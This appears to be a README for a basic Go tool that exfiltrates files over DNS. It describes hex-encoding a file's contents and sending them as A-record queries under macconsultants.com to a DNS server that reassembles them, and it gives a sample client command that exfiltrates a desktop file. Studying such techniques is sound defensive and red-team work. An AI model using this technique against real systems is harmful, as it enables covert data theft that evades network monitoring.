This is a very basic file exfiltration tool that uses DNS A records to exfiltrate files.

How it Works:
1. build the server and start it (sudo ./<binname>)
2. The dns server will then listen for incoming DNS connections
3. The dns server will resolve any request it gets to 10.10.10.10
4. build and run the client and feed it a single parameter which is the path to the file you want to exfil. Example:

./go-dnsclient ~/Desktop/importantfile.txt

5. the client will then read the contents of the file, hex encode it, and send it in 10 character chunks as A record requests. The format of each request is:
[10 hex encoded characters].macconsultants.com
6. Once done the server will take all of the hex encoded data, combine, and unhexlify it to a file as ASCII in the same directory. The output file is called outfile.
7. The server will not indicate when done but the client does. Once the client says it is done, you can kill the server and view the contents of outfile.
8. You will need to rename the outfile if you want to send multiple files, since the server will overwrite it


